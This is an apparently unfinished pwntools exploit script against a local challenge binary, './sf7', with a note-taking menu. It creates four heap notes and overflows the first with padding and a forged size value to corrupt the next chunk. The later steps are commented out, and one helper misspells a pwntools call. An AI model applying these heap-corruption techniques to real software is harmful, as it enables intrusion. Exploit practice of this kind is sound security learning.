from pwn import*
p = process('./sf7')
# gadget

# def
def menu(sel):
	p.sendlineafter('> ',str(sel))

def create(size,memo):
	menu(1)
	p.sendlineafter('note size : ',str(size))
	p.sendlineafter('memo : ',memo)

def modify(memo,new_memo):
	menu(3)
	p.sendlineafter('memo : ',memo)
	p.sendafter('new memo : ',new_memo)

def delete(memo):
	menu(4)
	p.sendlineafter('memo : ',memo)

def author(name):
	p.sendliteafter('new author : ',name)

# exploit
p.sendline('X'*8)
create(0x10,'a'*8)
create(0x10,'b'*8)
create(0x10,'c'*8)
create(0x10,'d'*8)

modify('a'*8,p64(0)*9+p16(0xa1))
#modify('c'*8,p64(0)*4+p64(0xa0))
#delete('b'*8)
p.interactive()
